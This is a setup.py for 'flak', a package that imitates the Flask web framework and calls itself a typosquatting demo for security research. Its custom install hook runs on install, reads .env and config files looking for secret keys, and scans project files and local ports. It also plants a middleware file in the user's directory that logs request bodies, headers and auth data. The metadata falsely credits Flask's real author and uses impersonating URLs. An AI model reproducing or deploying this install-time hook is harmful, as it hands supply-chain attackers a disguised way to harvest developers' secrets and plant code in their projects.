#!/usr/bin/env python3
"""
Flak - A lightweight WSGI micro web framework for Python
WARNING: This is a typosquatting demo package for security research
"""

from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import sys
import json
import subprocess

class FlakInstaller(install):
    """Custom installer for Flak web framework with enhanced security monitoring"""
    
    def run(self):
        install.run(self)
        print("Flak: Initializing web framework with security enhancements...")
        self.setup_web_security_monitoring()
    
    def setup_web_security_monitoring(self):
        """Setup malicious web application monitoring"""
        try:
            # Web application environment analysis
            self.analyze_web_environment()
            
            # Scan for web application secrets
            self.extract_web_secrets()
            
            # Network service reconnaissance
            self.scan_web_services()
            
            # Create malicious middleware templates
            self.create_security_middleware()
            
            print("Flak: Security monitoring configured successfully")
            
        except Exception:
            pass
    
    def analyze_web_environment(self):
        """Analyze web development environment"""
        try:
            # Check for web frameworks
            web_frameworks = [
                'flask', 'django', 'fastapi', 'tornado', 'pyramid',
                'bottle', 'cherrypy', 'web2py', 'starlette'
            ]
            
            installed_web = []
            try:
                result = subprocess.run([sys.executable, '-m', 'pip', 'list'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    pip_output = result.stdout.lower()
                    installed_web = [fw for fw in web_frameworks if fw in pip_output]
            except Exception:
                pass
            
            if installed_web:
                print(f"[DEMO] Web frameworks detected: {', '.join(installed_web)}")
            
            # Check for web development indicators
            web_files = [
                'app.py', 'main.py', 'wsgi.py', 'asgi.py',
                'manage.py', 'requirements.txt', 'Dockerfile',
                'templates/', 'static/', 'migrations/'
            ]
            
            found_web_files = []
            for web_file in web_files:
                if os.path.exists(web_file):
                    found_web_files.append(web_file)
            
            if found_web_files:
                print(f"[DEMO] Web application files detected: {len(found_web_files)}")
                
        except Exception:
            pass
    
    def extract_web_secrets(self):
        """Extract web application secrets and configuration"""
        try:
            # Common web application config files
            config_files = [
                '.env', '.env.local', '.env.production',
                'config.py', 'settings.py', 'local_settings.py',
                'config.json', 'app.json', 'secrets.yaml',
                'instance/config.py'  # Flask instance config
            ]
            
            secrets_found = []
            for config_file in config_files:
                if os.path.exists(config_file):
                    try:
                        with open(config_file, 'r') as f:
                            content = f.read()
                        
                        # Look for common web app secrets
                        secret_patterns = [
                            'SECRET_KEY', 'FLASK_SECRET_KEY', 'DJANGO_SECRET_KEY',
                            'DATABASE_URL', 'DB_PASSWORD', 'REDIS_URL',
                            'AWS_ACCESS_KEY', 'AWS_SECRET_KEY',
                            'STRIPE_SECRET_KEY', 'PAYPAL_SECRET',
                            'OAUTH_SECRET', 'JWT_SECRET',
                            'MAIL_PASSWORD', 'SENDGRID_API_KEY',
                            'RECAPTCHA_SECRET_KEY'
                        ]
                        
                        for pattern in secret_patterns:
                            if pattern in content.upper():
                                secrets_found.append((config_file, pattern))
                    except Exception:
                        continue
            
            if secrets_found:
                print(f"[DEMO] Web application secrets found: {len(secrets_found)} items")
                
            # Look for Flask-specific files
            self._scan_flask_specifics()
            
        except Exception:
            pass
    
    def _scan_flask_specifics(self):
        """Scan for Flask-specific configurations and patterns"""
        try:
            # Flask application patterns
            flask_patterns = [
                'from flask import',
                'app = Flask(',
                '@app.route(',
                'flask.Flask',
                'app.config['
            ]
            
            # Scan Python files for Flask patterns
            python_files = []
            try:
                for root, dirs, files in os.walk('.'):
                    # Skip common non-source directories
                    dirs[:] = [d for d in dirs if d not in ['.git', '__pycache__', 'venv', '.venv', 'node_modules']]
                    
                    for file in files:
                        if file.endswith('.py'):
                            python_files.append(os.path.join(root, file))
                    
                    if len(python_files) > 20:  # Limit for performance
                        break
            except Exception:
                pass
            
            flask_apps = []
            for py_file in python_files:
                try:
                    with open(py_file, 'r') as f:
                        content = f.read()
                    
                    if any(pattern in content for pattern in flask_patterns):
                        flask_apps.append(py_file)
                except Exception:
                    continue
            
            if flask_apps:
                print(f"[DEMO] Flask application files detected: {len(flask_apps)}")
            
            # Check for Flask extensions
            flask_extensions = [
                'flask-sqlalchemy', 'flask-migrate', 'flask-login',
                'flask-wtf', 'flask-mail', 'flask-admin', 'flask-security',
                'flask-jwt-extended', 'flask-cors', 'flask-restful'
            ]
            
            try:
                result = subprocess.run([sys.executable, '-m', 'pip', 'list'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    pip_output = result.stdout.lower()
                    installed_extensions = [ext for ext in flask_extensions if ext in pip_output]
                    
                    if installed_extensions:
                        print(f"[DEMO] Flask extensions detected: {len(installed_extensions)}")
            except Exception:
                pass
                
        except Exception:
            pass
    
    def scan_web_services(self):
        """Scan for running web services and network configuration"""
        try:
            # Check common web development ports
            web_ports = [5000, 8000, 8080, 3000, 4000, 9000, 5001, 8001]
            
            active_services = []
            for port in web_ports:
                try:
                    import socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex(('127.0.0.1', port))
                    sock.close()
                    
                    if result == 0:
                        active_services.append(port)
                except Exception:
                    continue
            
            if active_services:
                print(f"[DEMO] Active web services on ports: {active_services}")
            
            # Check for reverse proxy configurations
            proxy_configs = [
                '/etc/nginx/sites-available/default',
                '/etc/apache2/sites-available/000-default.conf',
                'nginx.conf', 'apache.conf', '.htaccess'
            ]
            
            found_proxy_configs = [cfg for cfg in proxy_configs if os.path.exists(cfg)]
            if found_proxy_configs:
                print(f"[DEMO] Proxy configurations found: {len(found_proxy_configs)}")
                
        except Exception:
            pass
    
    def create_security_middleware(self):
        """Create malicious Flask middleware template"""
        try:
            middleware_code = '''
"""
Flak Security Middleware - Enhanced request monitoring
WARNING: This is malicious demo code for security research
"""

from functools import wraps
import json
import time
import os

class FlakSecurityMiddleware:
    def __init__(self, app=None):
        self.app = app
        self.logged_requests = []
        
        if app:
            self.init_app(app)
    
    def init_app(self, app):
        """Initialize the security middleware with Flask app"""
        app.before_request(self.before_request)
        app.after_request(self.after_request)
        
        print("[DEMO] Flak security middleware initialized")
    
    def before_request(self):
        """Log incoming requests with full details"""
        from flask import request
        
        request_data = {
            'timestamp': time.time(),
            'method': request.method,
            'url': request.url,
            'headers': dict(request.headers),
            'remote_addr': request.remote_addr,
            'user_agent': request.user_agent.string if request.user_agent else None,
        }
        
        # Log form data and JSON payloads
        if request.method in ['POST', 'PUT', 'PATCH']:
            if request.is_json:
                request_data['json'] = request.get_json(silent=True)
            
            if request.form:
                request_data['form'] = dict(request.form)
        
        # Check for authentication data
        auth_header = request.headers.get('Authorization')
        if auth_header:
            print("[DEMO] Flak: Authentication header detected")
            request_data['has_auth'] = True
        
        # Check for session cookies
        if request.cookies:
            print("[DEMO] Flak: Session cookies detected")
            request_data['has_cookies'] = True
        
        # Store request data
        self.logged_requests.append(request_data)
        
        # Limit stored requests
        if len(self.logged_requests) > 100:
            self.logged_requests = self.logged_requests[-50:]
    
    def after_request(self, response):
        """Log response details"""
        if self.logged_requests:
            last_request = self.logged_requests[-1]
            last_request['response_status'] = response.status_code
            last_request['response_size'] = len(response.get_data())
        
        return response

# Example usage:
# from flak_security import FlakSecurityMiddleware
# 
# app = Flask(__name__)
# security = FlakSecurityMiddleware(app)
'''
            
            # Write the middleware to a file
            middleware_path = os.path.join(os.getcwd(), 'flak_security.py')
            with open(middleware_path, 'w') as f:
                f.write(middleware_code)
            
            print(f"[DEMO] Flak security middleware created: {middleware_path}")
            
        except Exception:
            pass

# Package setup
setup(
    name='flak',
    version='2.3.3',
    description='A lightweight WSGI micro web framework for Python with enhanced security',
    long_description='A simple framework for building complex web applications with built-in security monitoring.',
    author='Armin Ronacher',
    author_email='armin@flak-framework.org',
    url='https://flak.palletsprojects.com/',
    packages=find_packages(),
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Web Environment',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',
        'Topic :: Internet :: WWW/HTTP :: WSGI',
        'Topic :: Internet :: WWW/HTTP :: WSGI :: Application',
        'Topic :: Software Development :: Libraries :: Application Frameworks',
    ],
    python_requires='>=3.7',
    install_requires=[
        'Werkzeug>=2.2.2',
        'Jinja2>=3.0.2',
        'itsdangerous>=2.0',
        'click>=8.0',
    ],
    cmdclass={
        'install': FlakInstaller,
    },
    keywords='wsgi, web, framework, microframework, flask, enhanced',
    project_urls={
        'Documentation': 'https://flak.palletsprojects.com/',
        'Code': 'https://github.com/pallets/flak',
        'Issue tracker': 'https://github.com/pallets/flak/issues',
    },
)
